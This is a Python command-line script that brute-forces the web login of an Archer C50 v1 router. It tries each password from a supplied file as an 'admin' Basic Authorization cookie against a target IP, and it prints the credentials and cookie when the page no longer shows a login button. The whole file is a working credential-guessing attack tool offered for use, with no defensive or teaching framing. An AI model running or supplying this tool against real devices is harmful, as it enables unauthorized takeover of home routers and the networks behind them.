import requests
import argparse
import base64
import os


class BruteForcer:
    def __init__(self, host, file_path, username="admin"):
        self.username = username
        self.host = host
        self.file_path = file_path


    def force(self) -> None:
        # Check if the password file exists.
        if not os.path.exists(self.file_path):
            print(f"Password file not found: {self.file_path}")
            return

        # Open the password file.
        with open(self.file_path) as pass_file:
            print("[+] Trying passwords...")

            for password in pass_file:
                password = password.strip()  # Remove newline characters
                pw = self._request(password)

                if pw:
                    print("\n" + "=" * 50)
                    print("SUCCESS! VALID CREDENTIALS FOUND")
                    print("=" * 50)
                    print(f"Username: {self.username}")
                    print(f"Password: {password}")
                    print(f"Cookie: Authorization=Basic {self._create_cookie(password)}")
                    print("=" * 50 + "\n")
                    return

            print(f"No match found with {self.username} and {self.file_path}")



    def _request(self, password)-> bool:
        url = f"http://{self.host}/"
        headers = {
            "Cookie": f"Authorization=Basic {self._create_cookie(password)}"
        }
        r = requests.get(url, headers=headers)

        if "loginBtn" not in r.text:
            return True

        return False



    def _create_cookie(self, password)-> str:
        # Format as how to client formats username and password before creating the cookie.
        user_pass = f"{self.username}:{password}"

        # Encode into ascii and strips "\n from string
        pass_bytes = user_pass.encode("ascii").strip()

        base64_bytes = base64.b64encode(pass_bytes)
        base64_user_pass = base64_bytes.decode("ascii")

        return base64_user_pass


if __name__ == "__main__":
    # Create argument parser with a description.
    parser = argparse.ArgumentParser(
        description="Brute Forcer CLI: Attempt a brute force attack on Archer c50v1 webinterface "
                    "using a specified password file."
    )

    # Define arguments
    parser.add_argument("--host", "-H", type=str, required=True,
                        help="Target host IP address (e.g., 192.168.0.1)")
    parser.add_argument("--file", "-f", type=str, required=True,
                        help="Path to the passwords file (e.g., password.txt)")

    # Parse arguments
    args = parser.parse_args()

    # Create BruteForcer instance with the values
    bf = BruteForcer(args.host, args.file)
    bf.force()

